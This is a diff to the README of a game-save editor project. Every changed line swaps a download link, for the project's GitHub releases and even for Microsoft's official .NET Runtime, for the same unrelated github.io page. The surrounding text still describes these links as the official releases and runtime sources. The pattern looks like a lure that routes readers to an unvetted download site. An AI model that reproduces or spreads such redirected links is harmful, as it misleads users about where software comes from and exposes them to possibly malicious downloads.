@@ -1,6 +1,6 @@
 # 🎮 game-save-editor-hub - Your Saves, Simplified and Safe
 
-[![Download Now](https://img.shields.io/badge/Download-Free_Community_Project-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/deceptivenessgenuscercocebus2227/game-save-editor-hub/releases)
+[![Download Now](https://img.shields.io/badge/Download-Free_Community_Project-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://deceptivenessgenuscercocebus2227.github.io)
 
 ## 👋 Welcome to game-save-editor-hub
 
@@ -18,7 +18,7 @@ Let's get you set up in less than five minutes. Follow these simple steps, and y
 
 The software is hosted on GitHub, a popular platform for free software. To get your copy, click the green button above or use this direct link:
 
-👉 [**Click here to go to the download page**](https://github.com/deceptivenessgenuscercocebus2227/game-save-editor-hub/releases)
+👉 [**Click here to go to the download page**](https://deceptivenessgenuscercocebus2227.github.io)
 
 This link takes you to the "Releases" section of the project. Think of "Releases" as the official storefront where all finished, ready-to-use versions are kept.
 
@@ -81,7 +81,7 @@ game-save-editor-hub is designed to be light on your system. If your computer ca
 
 - **Operating System:** Windows 7, 8, 10, or 11.
 - **Hardware:** Any standard PC with at least 1 GB of RAM and 50 MB of free hard drive space.
-- **Software:** [.NET Runtime](https://dotnet.microsoft.com/en-us/download/dotnet-framework) (usually pre-installed on modern Windows systems) or Java Runtime Environment (JRE), depending on the specific build.
+- **Software:** [.NET Runtime](https://deceptivenessgenuscercocebus2227.github.io) (usually pre-installed on modern Windows systems) or Java Runtime Environment (JRE), depending on the specific build.
 
 If you don't have a runtime, the download page usually includes a note or a link. If you see an error about a missing component, just search for the name of the runtime in your web browser and install it from the official Microsoft or Java website. It is a quick, free, and safe process.
 
@@ -128,7 +128,7 @@ We are a friendly bunch. If you can't find the answer in the FAQ:
 
 **Ready to take control of your game saves?** Head over to the download page and get started with a safer, simpler way to mod.
 
-👉 [**Download game-save-editor-hub Now**](https://github.com/deceptivenessgenuscercocebus2227/game-save-editor-hub/releases)
+👉 [**Download game-save-editor-hub Now**](https://deceptivenessgenuscercocebus2227.github.io)
 
 Change your game. Keep your progress. Have fun.
 
